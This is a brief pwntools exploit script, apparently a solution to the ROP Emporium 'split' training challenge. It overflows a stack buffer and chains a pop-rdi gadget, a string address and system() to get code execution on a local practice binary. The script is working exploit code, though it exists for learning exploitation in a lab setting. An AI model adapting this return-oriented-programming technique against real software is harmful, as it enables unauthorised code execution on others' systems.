from pwn import * 
 
p = process('./split') 
elf = ELF('./split') 
sys_addr = elf.plt['system'] 
binsh_addr = 0x0000000000601060 
pop_rdi_addr = 0x00000000004007c3 
payload = 'A'*0x20 + 'A'*0x08 + p64(pop_rdi_addr)+ p64(binsh_addr)+p64(sys_addr) 
p.sendlineafter('> ',payload) 
p.interactive()
